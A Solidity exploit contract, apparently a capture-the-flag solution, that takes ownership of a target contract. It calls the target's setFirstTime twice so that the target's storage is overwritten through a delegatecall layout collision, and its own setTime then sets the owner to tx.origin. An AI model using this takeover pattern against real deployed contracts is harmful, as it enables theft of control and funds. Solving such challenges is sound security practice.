// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


// Goal
// 1.become the owner

contract Exploit {
    address public target;
    address public address2;
    address public owner;

    constructor(address _t) {
        target = _t;
    }

    function exploit() external {
        uint256 time = uint256(uint160(address(this)));
        (bool ok,) = target.call(
            abi.encodeWithSignature("setFirstTime(uint256)", time)
        );
        require(ok, "setFirstTime() failed");

        (ok, ) = target.call(
            abi.encodeWithSignature("setFirstTime(uint256)", time)
        );    
        require(ok, "second call failed");
    }

    function setTime(uint256 t) public {
        owner = tx.origin;
    }
}
